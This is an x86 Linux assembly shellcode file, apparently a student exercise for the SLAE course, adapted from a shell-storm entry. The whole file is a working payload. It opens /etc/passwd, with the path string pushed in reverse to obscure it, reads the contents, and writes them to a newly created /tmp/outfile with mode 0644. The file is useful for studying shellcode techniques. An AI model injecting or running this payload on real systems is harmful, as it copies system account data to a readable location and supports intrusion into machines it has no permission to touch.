; Student:   SLAE-755
; http://shell-storm.org/shellcode/files/shellcode-864.php


global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx

    ; python -c "print '\x64\x77\x73\x73\x61\x70\x2f\x63\x74\x65\x2f\x2f'"
    ; dwssap/cte//
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80


    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx

    ;eliftuo/pmt/
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f

    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80
